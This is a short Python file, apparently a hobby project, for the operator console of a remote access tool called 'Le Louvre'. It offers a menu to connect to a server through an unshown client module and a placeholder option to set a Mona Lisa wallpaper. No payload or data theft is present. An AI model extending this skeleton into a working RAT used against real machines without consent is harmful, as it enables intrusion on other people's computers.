import client

class LeLouvre:
    def __init__(self):
        self.commands = {
            "0": "Exit from RAT interface",
            "1": "Run Server",
            "2": "Set Mona Lisa as desktop background"
        }
        self.client = client.Client()

    """ Establish a connection to remote RAT interface. """
    def connect_to_server(self):
        self.client.connect()
    
    def disconnect_from_server(self):
        self.client.close()

    """ Runs an interactive CLI RAT interface. """
    def run_rat_interface(self):
        while True:
            print("\n#######################\nLe Louvre RAT Interface\n#######################\n")
            for command, description in self.commands.items():
                print(command, "->", description)
            
            command_key = input("\nEnter command: ")
            # Invalid input
            if command_key not in self.commands:
                print("Invalid command, please try again.")
                continue
            # Exit program
            elif command_key == "0":
                print("Exiting.")
                return
            else:
                self.execute_command(command_key)

    """ Executes command based on the command key provided. """
    def execute_command(self, command_key):
        # Establish server for client connection
        if command_key == "1":
            self.connect_to_server()
            resp = self.client.message("1")
            print(resp)
            self.disconnect_from_server()
        # TODO: Set background to Mona Lisa
        elif command_key == "2":
            pass
            
if __name__=="__main__":
    le_louvre = LeLouvre()
    le_louvre.run_rat_interface()